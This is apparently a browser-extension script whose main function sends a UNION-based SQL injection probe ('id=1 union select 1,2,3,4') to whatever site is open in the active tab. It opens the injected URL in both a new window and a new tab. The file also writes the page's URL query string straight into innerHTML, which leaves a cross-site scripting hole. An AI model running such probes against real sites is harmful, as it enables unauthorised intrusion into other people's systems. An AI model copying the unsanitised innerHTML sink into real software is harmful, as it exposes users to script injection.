url = window.location.href; 
//console.log(url);
var aa = url.indexOf('?');
if (aa > -1)
{
	url = url.substring(aa + 1);
	//console.log(url);
	document.getElementById("p1").innerHTML=url;
}



var btn=document.getElementById('btn');
btn.onclick=function(){


    browser.tabs.query({ currentWindow: true, active: true }, function (tabs) {
		console.log(tabs);
		// window.http = tabs[0].url;
		
		window.open(tabs[0].url+"/?id=1%20union%20select%201,2,3,4");
		console.log(tabs[0].url+"/?id=1%20union%20select%201,2,3,4");
		browser.tabs.create({
			url:tabs[0].url+"/?id=1%20union%20select%201,2,3,4"
	  });
    });

}


